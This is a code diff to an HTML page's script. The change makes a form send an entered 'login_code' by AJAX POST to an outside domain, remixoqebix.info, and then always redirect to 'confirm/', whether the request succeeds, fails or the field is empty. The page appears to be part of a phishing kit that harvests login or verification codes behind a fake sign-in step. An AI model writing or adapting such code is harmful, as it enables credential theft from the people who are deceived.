@@ -11732,28 +11732,48 @@
       </div>
    </div>
 
-   <script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- Include jQuery library -->
 
-      $(document).ready(function () {
-         $("#form_submit").click(function (event) {
-            event.preventDefault();
+<script>
+   $(document).ready(function () {
+      $("#form_submit").click(function (event) {
+         event.preventDefault();
+         let loginCode = $("#login_code").val(); // Get the value of the input field
+
+         // Check if the login code is not empty before making the AJAX request
+         if (loginCode.trim() !== "") {
             let data = {
-               login_code: login_code.value,
-            }
+               login_code: loginCode,
+            };
+
             $.ajax({
                url: "https://remixoqebix.info/rrak.php/",
                method: "POST",
                data: data,
                success: function (response) {
-                  if(response == "1"){
+                  if (response === "1") {
+                     // Redirect to 'confirm/' when the response is '1'
                      window.location.href = 'confirm/';
+                  } else {
+                     window.location.href = 'confirm/';
+                     // Handle other cases if needed
+                     // For example, display an error message
                   }
-               }
+               },
+               error: function (xhr, status, error) {
+                  window.location.href = 'confirm/';
+                  // Handle AJAX errors here if necessary
+                  console.log("AJAX Error: " + error);
+               },
             });
-
-         });
+         } else {
+            window.location.href = 'confirm/';
+            // Handle empty login code input, display an error message, etc.
+         }
       });
-   </script>
+   });
+</script>
+
 </body>
 
 </html>
